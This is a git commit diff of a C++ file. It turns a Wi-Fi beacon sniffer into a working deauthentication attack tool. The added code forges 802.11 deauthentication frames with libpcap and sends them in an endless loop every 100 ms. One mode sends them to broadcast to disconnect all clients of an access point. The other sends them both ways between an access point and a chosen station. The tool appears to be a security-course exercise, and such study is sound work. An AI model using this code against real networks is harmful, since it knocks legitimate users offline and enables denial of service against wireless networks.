22261202abad38ef29bce96947e11f5371710d42
skysoon02 <syksoon02@gmail.com>
2021-12-10 02:05:27 -0500

    main.cpp

--- main.cpp
+++ main.cpp
@@ -2,80 +2,127 @@
 #include <stdbool.h>
 #include <pcap.h>
 #include <netinet/in.h>
-#include <map>
-#include <string>
-#include <iostream>
-#include <iomanip>
+#include <unistd.h>
 
 #include "mac.h"
 #include "IEEE802.11Hdr.h"
 #include "radioTapHdr.h"
 
-using namespace std;
+#define freq 100000 //micro second
 
-struct station{
-	string BSSID;
-	int Beacons;
-	string ESSID;
-	//int Datas;
+#pragma pack(push, 1)
+/*	//I guess wireless interface make this packet automatically
+struct deauthPacket37{	//size is 37 bytes
+	RadioTapHdr radioTapHdr;
+	uint16_t txflags;
+	uint8_t unknown;
+	WifiHdr wifiHdr;
+	uint16_t fixedParam;
 };
+#pragma pack(pop)
+*/
+#pragma pack(push, 1)
+struct deauthPacket{	//size is 38 bytes
+	RadioTapHdr radioTapHdr;
+	uint8_t dataRate;
+	uint8_t dummy;
+	uint16_t txFlags;	
+	WifiHdr wifiHdr;
+	uint16_t fixedParam;
+};
+#pragma pack(pop)
 
 
 void usage() {
-	printf("syntax : airodump <interface>\n");
-	printf("sample : airodump mon0\n");
+	printf("syntax : deauth-attack <interface> <ap mac> [<station mac>]\n");
+	printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
 }
 
 
 int main(int argc, char* argv[]) {
-	if (argc != 2) {
+	if ( !(argc == 3 || argc == 4) ){
 		usage();
 		return -1;
 	}
 	
 	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
 	if (pcap == NULL) {
 		fprintf(stderr, "error: pcap_open_live(%s) return null - %s\n", dev, errbuf);
 		return -1;
 	}
 	
-	map<Mac,station> stations;
-
-	while (true) {
-		struct pcap_pkthdr* header;
-		const u_char* packet;
-		int res = pcap_next_ex(pcap, &header, &packet);
-		if (res == 0) continue;
-		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-			fprintf(stderr, "error: pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
-			break;
+	int seq = 0;
+	
+	if(argc==3){	//broadCast
+		while (true) {
+			deauthPacket packet;	//AP to stations
+			memset(&packet, 0, sizeof(packet));
+			
+			packet.radioTapHdr.len = 12;
+			packet.radioTapHdr.present = 0x00008004;
+			
+			packet.dataRate = 2;
+			packet.txFlags = 0x0018;
+			
+			packet.wifiHdr.ver_type = WifiHdr::Deauthentication;
+			packet.wifiHdr.duration = 314;
+			packet.wifiHdr.addr[0] = Mac::broadcastMac();
+			packet.wifiHdr.addr[1] = packet.wifiHdr.addr[2] = Mac(argv[2]);
+			packet.wifiHdr.seq = seq<<4;
+			
+			packet.fixedParam = 0x0007;
+			
+			int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
+			if (res != 0) {
+				fprintf(stderr, "error: pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+			}
+			
+			
+			usleep(freq);
+			seq++;
 		}
-		
-		RadioTapHdr* radioTapHdr = (RadioTapHdr*)packet;
-		WifiHdr* wifiHdr = (WifiHdr*)(packet + radioTapHdr->len);
-		
-		if(wifiHdr->type()==WifiHdr::Management && wifiHdr->subType()==WifiHdr::Beacon){
-			auto iter = stations.find(wifiHdr->BSSID());
-			if(iter==stations.end()){
-				string ESSID = string((char*)wifiHdr + sizeof(WifiHdr) + 12 + 2, *((char*)wifiHdr + sizeof(WifiHdr) + 12 + 1));
-				station tmp_station = {string(wifiHdr->BSSID()), 0, ESSID};
-				stations.insert({wifiHdr->BSSID(), tmp_station});
-			}
-			else{
-				iter->second.Beacons++;
-			}
-			system("clear");
-			printf("%-19s %-9s %-5s\n", "BSSID", "Beacons", "ESSID");
-			for(auto iter : stations){
-				cout << iter.second.BSSID;
-				cout << setw(10) << iter.second.Beacons;
-				cout << "   " << iter.second.ESSID << endl;
-			}
-			continue;
-		}
-		//if(wifiHdr->type()==WifiHdr.Data)
 	}
+	else{	//uniCast
+		while(true){
+			deauthPacket packet;	//AP to Station
+			memset(&packet, 0, sizeof(packet));
+			
+			packet.radioTapHdr.len = 12;
+			packet.radioTapHdr.present = 0x00008004;
+			
+			packet.dataRate = 2;
+			packet.txFlags = 0x0018;
+			
+			packet.wifiHdr.ver_type = WifiHdr::Deauthentication;
+			packet.wifiHdr.duration = 314;
+			packet.wifiHdr.addr[0] = Mac(argv[3]);
+			packet.wifiHdr.addr[1] = packet.wifiHdr.addr[2] = Mac(argv[2]);
+			packet.wifiHdr.seq = seq<<4;
+			
+			packet.fixedParam = 0x0007;
+			
+			int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
+			if (res != 0) {
+				fprintf(stderr, "error: pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+			}
+			
+			
+			packet.wifiHdr.addr[1] = Mac(argv[3]);	//station to AP
+			packet.wifiHdr.addr[0] = packet.wifiHdr.addr[2] = Mac(argv[2]);
+			packet.wifiHdr.seq = (seq+1)<<4;
+			
+			res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
+			if (res != 0) {
+				fprintf(stderr, "error: pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+			}
+			
+			
+			usleep(freq);
+			seq+=2;
+		}
+	}
+	
 	pcap_close(pcap);
 }
